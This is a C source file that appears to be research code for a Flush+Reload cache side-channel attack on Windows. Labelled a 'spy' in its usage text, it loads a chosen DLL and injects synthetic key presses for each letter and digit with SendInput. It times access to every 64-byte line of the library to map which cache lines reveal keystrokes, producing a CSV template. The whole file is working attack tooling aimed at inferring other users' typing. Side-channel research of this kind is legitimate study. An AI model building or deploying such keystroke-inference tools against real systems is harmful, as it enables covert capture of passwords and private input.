#define WINVER 0x0500
#include <unistd.h>
#include <windows.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sched.h>
#include <stdint.h>
#include "../cacheutils.h"

#define MIN_CACHE_MISS_CYCLES (155)

INPUT ip;

size_t nkeys = 0;
char key[2];

void sendKey(char control, char key)
{
  if (control)
  {
    ip.ki.wVk = VK_CONTROL;
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));
  }

  usleep(10);

  ip.ki.wVk = key;
  ip.ki.dwFlags = 0; // 0 for key press
  SendInput(1, &ip, sizeof(INPUT));

  usleep(10);

  ip.ki.wVk = key;
  ip.ki.dwFlags = KEYEVENTF_KEYUP;
  SendInput(1, &ip, sizeof(INPUT));

  usleep(10);

  if (control)
  {
    ip.ki.wVk = VK_CONTROL;
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
  }
}

size_t flushandreload(void* addr, size_t duration)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + duration * 1000*1000;
  while(time < end)
  {
    time = rdtsc();
    maccess(addr);
    delta = rdtsc() - time;
    flush(addr);
    if (delta < MIN_CACHE_MISS_CYCLES)
    {
      count++;
    }
    sched_yield();
  }
  return count;
}

void keythread()
{
  int count = 0;
  char lkey = 'a';
  while (1)
  {
    if (*key != lkey)
    {
      lkey = *key;
      count = 0;
    }
    count++;
    nkeys++;
    sendKey(0,*key);
    usleep(1000);
  }
}

int main(int argc, char** argv)
{
  ip.type = INPUT_KEYBOARD;
  ip.ki.wScan = 0; // hardware scan code for key
  ip.ki.time = 0;
  ip.ki.dwExtraInfo = 0;
  ip.ki.dwFlags = 0; // 0 for key press
  pthread_t t;
  key[1] = 0;
  key[0] = 'a';
  if (argc < 3)
    exit(!fprintf(stderr,"  usage: ./spy <probeduration> <filename> [offset]\n"
                 "example: ./spy 200 file\n"));
  size_t duration = 0;
  if (!sscanf(argv[1],"%lu",&duration))
    exit(!printf("duration error\n"));
  size_t i = 0;
  if (argc == 4 && !sscanf(argv[3],"%lx",&i))
    exit(!printf("offset error\n"));
  char filename[4096];
  if (!sscanf(argv[2],"%s",filename))
    exit(!fprintf(stderr,"filename error\n"));
  size_t offset = 0;
  int fd = open(filename,O_RDONLY);
  size_t range = lseek(fd, 0, SEEK_END);
  fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
  if (duration == 0)
    exit(0);
  lseek(fd, 0, SEEK_SET);
  char* start = (char*)LoadLibrary(filename);
  pthread_create(&t,0,(void*(*)(void*))&keythread,0);
  char j = 0;
  char* chars = "0123456789abcdefghijklmnopqrstuvwxyz";
  size_t chars_len = strlen(chars);
  size_t count = 0;
  printf("file,addr");
  for (j = 0; j < chars_len; ++j)
  {
    printf(",%c",chars[j]);
  }
  printf("\n");
  size_t promille = 0;
  for (; i < range; i += 64)
  {
   printf("%s,0x%p",filename,(void*)offset + i);
   for (j = 0; j < chars_len; ++j)
   {
     key[0] = chars[j];
     usleep(1000);
     nkeys = 0;
     flush(start + i);
     usleep(200);
     count = flushandreload(start + i, duration);
     printf(",=%ld/%ld",count,nkeys);
    }
    printf("\n");
    if (1000 * i / range > promille)
    {
      promille = 1000 * i / range;
      fprintf(stderr,"%ld/1000\n",promille);
    }
 }
  return 0;
}

